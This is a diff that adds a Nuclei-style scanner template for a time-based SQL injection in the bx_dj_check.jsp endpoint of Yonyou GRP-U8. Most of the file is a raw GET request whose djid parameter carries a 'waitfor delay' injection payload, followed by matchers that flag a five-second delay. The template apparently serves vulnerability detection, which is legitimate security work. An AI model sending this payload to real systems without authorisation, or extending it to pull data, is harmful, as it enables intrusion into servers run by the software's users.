@@ -1,0 +1,24 @@
+id: YongYouGRPU8_bx_dj_check_sqlInjection
+
+info:
+  name: YongYouGRPU8_bx_dj_check_sqlInjection
+  author: HuanXiong
+  severity: high
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /u8qx/bx_dj_check.jsp?djlxdm=OER&djid=1%27;waitfor+delay+%270:0:5%27-- HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+      - type: status
+        status:
+          - 200
